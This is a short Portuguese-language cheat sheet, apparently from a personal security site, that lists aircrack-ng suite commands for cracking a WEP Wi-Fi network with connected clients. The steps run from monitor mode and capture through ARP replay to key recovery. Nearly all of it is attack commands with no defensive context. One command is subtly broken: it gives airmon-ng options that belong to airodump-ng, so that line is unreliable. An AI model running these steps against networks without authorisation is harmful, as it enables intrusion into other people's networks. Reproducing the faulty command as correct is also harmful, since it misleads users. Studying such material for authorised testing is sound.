---
title: "Wi-fi Cheat Sheet"
permalink: /ct/wifi-cs/
layout: archive
author_profile: true
---

# Rede WEP
## Ataque: WEP com clientes

Colocando a placa em modo monitor
```
airmon-ng start wlan1
```

Dump do conteúdo capturado pela placa
```
airodump-ng wlan1mon
```

Travando a placa no alvo e salvando o conteúdo capturado em um arquivo
```
airmon-ng --essid <target-wifi> --channel <channel> wlan1mon -w wep
```

Gerando tráfego para capturar o IV
```
aireplay-ng -3 -b $bssid -h $client wlan1mon
```

Quebrando a chave capturada
```
aircrack-ng -a 1 wep-0*.cap
```